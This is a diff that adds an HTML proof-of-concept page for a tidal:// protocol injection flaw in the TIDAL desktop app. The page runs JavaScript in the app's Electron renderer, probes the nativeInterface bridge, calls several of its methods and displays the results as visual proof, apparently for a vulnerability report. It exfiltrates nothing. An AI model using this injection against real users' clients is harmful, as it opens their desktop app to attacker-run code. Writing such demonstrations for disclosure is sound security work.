@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>PoC - TIDAL Protocol Injection</title>
+</head>
+<body>
+    <h1>PoC Loaded</h1>
+
+    <script>
+        alert("JavaScript execution confirmed in TIDAL desktop renderer");
+
+        console.log("[POC] Execution inside Electron renderer via tidal://");
+        console.log("URL:", window.location.href);
+        console.log("Origin:", window.location.origin);
+
+        // Bridge presence
+        console.log("nativeInterface present:", !!window.nativeInterface);
+
+        // Working API calls (these are your strongest proof)
+        const platform = window.nativeInterface?.application?.getPlatform?.();
+        const target = window.nativeInterface?.application?.getPlatformTarget?.();
+        const releaseNotes = window.nativeInterface?.application?.getDesktopReleaseNotes?.();
+        const windowSize = window.nativeInterface?.window?.getSize?.();
+        const isMaximized = window.nativeInterface?.window?.isMaximized?.();
+
+        console.log("Platform:", platform);
+        console.log("Target:", target);
+        console.log("ReleaseNotes:", releaseNotes);
+        console.log("Window Size:", windowSize);
+        console.log("Is Maximized:", isMaximized);
+
+        // Visual proof for screenshots
+        document.body.style.background = "#111";
+        document.body.style.color = "#0f0";
+
+        document.body.innerHTML += "<p>Injected content executed successfully.</p>";
+
+        document.body.innerHTML += "<pre>" + JSON.stringify({
+            url: window.location.href,
+            origin: window.location.origin,
+            nativeInterface: !!window.nativeInterface,
+            platform: platform,
+            target: target,
+            windowSize: windowSize,
+            isMaximized: isMaximized
+        }, null, 2) + "</pre>";
+    </script>
+</body>
+</html>
